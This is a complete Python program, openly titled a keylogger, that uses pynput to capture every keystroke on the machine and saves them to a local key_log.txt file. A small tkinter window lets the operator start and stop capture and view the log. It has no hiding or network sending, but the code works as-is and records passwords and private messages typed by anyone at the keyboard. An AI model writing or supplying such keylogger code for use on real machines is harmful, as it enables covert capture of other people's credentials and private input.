import os
from pynput.keyboard import Listener
import tkinter as tk
from tkinter import scrolledtext, filedialog, messagebox
import threading

log_dir = ""
log_file = ""
logging = False
listener = None

def start_keylogger():
    global logging, listener
    if logging:
        messagebox.showinfo("Info", "Keylogger is already running!")
        return
    logging = True
    listener = Listener(on_press=write_to_file)
    listener.start()
    messagebox.showinfo("Info", "Keylogger started!")

def stop_keylogger():
    global logging, listener
    if not logging:
        messagebox.showinfo("Info", "Keylogger is not running!")
        return
    listener.stop()
    logging = False
    messagebox.showinfo("Info", "Keylogger stopped!")

def view_logs():
    if not os.path.exists(log_file):
        messagebox.showinfo("Info", "No logs found! Please start the keylogger first.")
        return
    log_window = tk.Toplevel()
    log_window.title("View Logs")
    text_area = scrolledtext.ScrolledText(log_window, width=80, height=20, wrap='word')
    text_area.pack(expand=True, fill='both')
    with open(log_file, 'r') as f:
        content = f.read()
    text_area.insert(tk.END, content)

def select_directory():
    global log_dir, log_file
    log_dir = filedialog.askdirectory(title="Select Directory to Save Log File")
    if not log_dir:
        messagebox.showwarning("Warning", "No directory selected. Please choose a directory.")
        return
    log_file = os.path.join(log_dir, "key_log.txt")
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    messagebox.showinfo("Info", f"Logs will be saved in: {log_file}")

def write_to_file(key):
    key = str(key).replace("'", "")
    with open(log_file, 'a') as f:
        f.write(key)
        if key == 'Key.enter':
            f.write('\n')

window = tk.Tk()
window.title("Keylogger Tool")
window.geometry("400x300")
label = tk.Label(window, text="Simple Keylogger with GUI", font=("Arial", 16))
label.pack(pady=10)
select_button = tk.Button(window, text="Select Directory", command=select_directory, font=("Arial", 12))
select_button.pack(pady=5)
start_button = tk.Button(window, text="Start Keylogger", command=start_keylogger, font=("Arial", 12))
start_button.pack(pady=5)
stop_button = tk.Button(window, text="Stop Keylogger", command=stop_keylogger, font=("Arial", 12))
stop_button.pack(pady=5)
view_button = tk.Button(window, text="View Logs", command=view_logs, font=("Arial", 12))
view_button.pack(pady=5)
window.mainloop()